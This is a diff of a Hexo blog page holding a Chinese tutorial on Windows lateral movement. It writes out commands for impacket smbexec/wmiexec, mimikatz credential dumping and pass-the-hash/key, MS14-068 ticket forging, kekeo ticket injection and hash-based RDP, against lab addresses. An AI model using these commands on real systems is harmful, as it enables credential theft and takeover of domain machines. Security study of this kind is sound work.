+<pre class="line-numbers language-none"><code class="language-none">smbexec ZJ&#x2F;administrator:666.com@10.1.1.1
+smbexec .&#x2F;administrator:666.com@10.1.1.1
+smbexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ZJ&#x2F;administrator@10.1.1.1
+smbexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 .&#x2F;administrator@10.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 <h1 id="wmic-amp-wmiexec"><a href="#wmic-amp-wmiexec" class="headerlink" title="wmic&amp;wmiexec"></a>wmic&amp;wmiexec</h1><p>WMI是通过<strong>135</strong>端口进行利用。支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。需要提权。</p>
 <p>#自带WMIC 明文传递 无回显</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:10.1.1.1 /user:administrator /password:666.com process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span><br><span class="line">命令结果在1.txt里，且保存在10.1.1.1的电脑里。</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:10.1.1.1 &#x2F;user:administrator &#x2F;password:666.com process call create &quot;cmd.exe &#x2F;c ipconfig &gt;C:\1.txt&quot;
+命令结果在1.txt里，且保存在10.1.1.1的电脑里。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>#自带cscript明文传输 有回显</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //nologo wmiexec.vbs /shell 10.1.1.1 administrator 666.com</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 10.1.1.1 administrator 666.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>#套件impacket的wmiexec  明文或hash传递 有回显exe版本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmiexec ./administrator:666.com@10.1.1.1 &quot;whoami&quot;</span><br><span class="line">wmiexec ZJ/administrator:666.com@10.1.1.1 &quot;whoami&quot;</span><br><span class="line">wmiexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ./administrator@10.1.1.1 &quot;whoami&quot;</span><br><span class="line">wmiexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ZJ/administrator@10.1.1.1 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">wmiexec .&#x2F;administrator:666.com@10.1.1.1 &quot;whoami&quot;
+wmiexec ZJ&#x2F;administrator:666.com@10.1.1.1 &quot;whoami&quot;
+wmiexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 .&#x2F;administrator@10.1.1.1 &quot;whoami&quot;
+wmiexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ZJ&#x2F;administrator@10.1.1.1 &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
@@ -331,19 +349,26 @@
 <p>ptk：打了补丁才能用户才可以连接，采用AES256连接。</p>
 <h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>ntlm 传递，工具：mimikatz</p>
 <p>首先用mimikatz得到ntlm值。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">privilege::debug
+sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>未打补丁的工作组及域连接：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:zj /ntlm:6f8a61c6702f90ae246aa2a298fcdc35</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:6f8a61c6702f90ae246aa2a298fcdc35</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">privilege::debug
+sekurlsa::pth &#x2F;user:administrator &#x2F;domain:zj &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35
+sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>然后会弹出一个cmd窗口，可以直接进行连接。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.1.1\IPC$</span><br><span class="line">dir \\10.1.1.1\c$</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">net use \\10.1.1.1\IPC$
+dir \\10.1.1.1\c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
 <h2 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h2><p>打了补丁<strong>kb2871997</strong>才能用</p>
 <p>首先要得到AES256的值，mimikatz：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:administrator /domain:zj.com /aes256:6f88e6d06c3ecb95e37fe23b3ef372738ec67871b71606c588a1668ca62161ac</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">privilege::debug
+sekurlsa::ekeys
+
+sekurlsa::pth &#x2F;user:administrator &#x2F;domain:zj.com &#x2F;aes256:6f88e6d06c3ecb95e37fe23b3ef372738ec67871b71606c588a1668ca62161ac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
@@ -351,326 +376,135 @@
 <p>能实现普通用户直接获取域控system权限</p>
 <p>#MS14-068 powershell执行</p>
 <p>1.查看当前sid </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>2.mimikaz   </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge			//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造。</span><br><span class="line">kerberos::list			//查看当前机器凭证</span><br><span class="line">kerberos::ptc 票据文件	 //将票据注入到内存中</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">kerberos::purge			&#x2F;&#x2F;清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造。
+kerberos::list			&#x2F;&#x2F;查看当前机器凭证
+kerberos::ptc 票据文件	 &#x2F;&#x2F;将票据注入到内存中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>3.利用MS14-068生成TGT数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u 域成员名@域名 -s sid -d 域控地址 -p 域成员密码</span><br><span class="line">MS14-068.exe -u jiarong.gao@zj.com -s S-1-5-21-3032773461-2117130829-2438403642-1103 -d 10.1.1.1 -p 666.com</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ms14-068.exe -u 域成员名@域名 -s sid -d 域控地址 -p 域成员密码
+MS14-068.exe -u jiarong.gao@zj.com -s S-1-5-21-3032773461-2117130829-2438403642-1103 -d 10.1.1.1 -p 666.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>4.票据注入内存</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc TGT_mary@zj.com.ccache&quot; exit</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::ptc TGT_mary@zj.com.ccache&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>5.查看凭证列表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">klist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>6.利用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\10.1.1.1\c$</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">dir \\10.1.1.1\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>第二种</strong>利用工具kekeo</p>
 <p>1.生成票据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgt::ask /user:jiarong.gao /domain:zj.com /ntlm:6f8a61c6702f90ae246aa2a298fcdc35&quot;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">kekeo &quot;tgt::ask &#x2F;user:jiarong.gao &#x2F;domain:zj.com &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>2.导入票据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt 票据名</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt 票据名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>2.查看凭证</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">klist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>4.利用net use 载入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\10.1.1.1\c$</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">dir \\10.1.1.1\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>第三种</strong>利用本地票据（管理员权限）、</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br><span class="line">kerberos::ptt xxxxxxxx.xxxx.kirbi</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">sekurlsa::tickets &#x2F;export
+kerberos::ptt xxxxxxxx.xxxx.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
 <h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><p>与linux的ssh协议类似，这是windows的远程桌面连接（图形）的协议，端口为<strong>3389</strong></p>
 <p>RDP明文密码连接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows:	mstsc</span><br><span class="line">mstsc.exe /console /v:10.1.1.1 /administrator</span><br><span class="line"></span><br><span class="line">linux: rdesktop 10.1.1.1:3389</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">windows:	mstsc
+mstsc.exe &#x2F;console &#x2F;v:10.1.1.1 &#x2F;administrator
+
+linux: rdesktop 10.1.1.1:3389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>RDP密文HASH链接</p>
 <p>windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win7 和Windows Server 2008 R2安装了KB2871997、KB2973351补丁也支持。</p>
 <p>开启命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mstsc.exe /restrictedadmin</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:zj /ntlm:6f8a61c6702f90ae246aa2a298fcdc35 &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">mstsc.exe &#x2F;restrictedadmin
+mimikatz.exe
+privilege::debug
+sekurlsa::pth &#x2F;user:administrator &#x2F;domain:zj &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 <hr>
 
-    </div>
-
-    
-    
-    
-        
-
-<div>
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>Ja1e
-  </li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    <a href="https://ja1e.github.io/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="横向移动">https://ja1e.github.io/2022/08/06/横向移动/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
-
-
-      <footer class="post-footer">
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2022/08/06/%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="prev" title="本地信息搜集">
-      <i class="fa fa-chevron-left"></i> 本地信息搜集
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2022/08/06/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="next" title="内网穿透">
-      内网穿透 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
+  <p> — 2022年8月6日</p>
   
 
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
 
         </div>
-          
+        <div class="row mt-2">
+  <h3>Search</h3>
+  <div><input id="search-text" title="search" class="search-text" type="text" placeholder="search......"></div>
+  <div style="margin-top: 1.5rem;">
+    <ul id="result"></ul>
+  </div>
+</div>
+        <div class="row mt-2">
   
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#at-amp-schtasks"><span class="nav-number">1.</span> <span class="nav-text">at&amp;schtasks</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#at"><span class="nav-number">1.1.</span> <span class="nav-text">at</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#schtasks"><span class="nav-number">1.2.</span> <span class="nav-text">schtasks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#atexec-impacket"><span class="nav-number">1.3.</span> <span class="nav-text">atexec-impacket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8"><span class="nav-number">1.4.</span> <span class="nav-text">批量利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#psexec-amp-smbexec"><span class="nav-number">2.</span> <span class="nav-text">psexec&amp;smbexec</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#psexec"><span class="nav-number">2.1.</span> <span class="nav-text">psexec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smbexec"><span class="nav-number">2.2.</span> <span class="nav-text">smbexec</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#wmic-amp-wmiexec"><span class="nav-number">3.</span> <span class="nav-text">wmic&amp;wmiexec</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PTH-amp-PTT-amp-PTK"><span class="nav-number">4.</span> <span class="nav-text">PTH&amp;PTT&amp;PTK</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PTH"><span class="nav-number">4.1.</span> <span class="nav-text">PTH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTK"><span class="nav-number">4.2.</span> <span class="nav-text">PTK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTT"><span class="nav-number">4.3.</span> <span class="nav-text">PTT</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RDP"><span class="nav-number">5.</span> <span class="nav-text">RDP</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">Ja1e</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">32</span>
-          <span class="site-state-item-name">日志</span>
+    <div class="eight columns">
+      <p id="madewith">Made with ❤ and
+        <a class="footer-link icon" href="https://hexo.io" target="_blank" style="text-decoration: none;" rel="noreferrer" aria-label="Hexo.io">
+        <svg class="hexo svg-hov" width="14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title>Hexo.js</title><path d="M12 .007L1.57 6.056V18.05L12 23.995l10.43-6.049V5.952L12 .007zm4.798 17.105l-.939.521-.939-.521V12.94H9.08v4.172l-.94.521-.938-.521V6.89l.939-.521.939.521v4.172h5.84V6.89l.94-.521.938.521v10.222z"/></svg>
         </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">7</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">14</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
+        
+    </div>
+
+    <!-- Sepcial thanks to https://simpleicons.org/ for the icons -->
+    <div class="four columns mb-3 posisi" >
+      
+      <a class="ml-0 footer-link icon" href="https://github.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="GitHub">
+        <svg class="github svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+      </a>
+      
+
+      
+
+      
+      <a class="ml-0 footer-link icon" href="https://twitter.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Twitter">
+        <svg class="twitter svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
+      </a>
+      
+
+      
+      <a class="ml-0 footer-link icon" href="https://instagram.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Instagram">
+        <svg class="instagram svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Instagram</title><path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/></svg>
+      </a>
+      
+
+      
+
+    </div>
+  
 </div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="https://github.com/ja1e" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ja1e" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:eveee428@proton.me" title="E-Mail → mailto:eveee428@proton.me" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-
-
-
+<script src="/js/prism/prism.js" async></script>
       </div>
 
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
 
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Ja1e</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-area"></i>
-    </span>
-      <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">91k</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">55 分钟</span>
-</div>
-
-
-<!-- 网站运行时间的设置 -->
-<span id="timeDate">载入天数...</span>
-<span id="times">载入时分秒...</span>
-<script>
-    var now = new Date();
-    function createtime() {
-        var grt= new Date("11/23/2021 15:54:40");//此处修改你的建站时间或者网站上线时间
-        now.setTime(now.getTime()+250);
-        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
-        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
-        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
-        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
-        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
-        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
-        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
-        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
-    }
-setInterval("createtime()",250);
-</script>
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-user"></i>
-      </span>
-      <span class="site-uv" title="总访客量">
-        <span id="busuanzi_value_site_uv"></span>
-      </span>
-    </span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="site-pv" title="总访问量">
-        <span id="busuanzi_value_site_pv"></span>
-      </span>
-    </span>
-</div>
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
   </div>
+  <script src="/js/nanobar.min.js"></script>
 
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
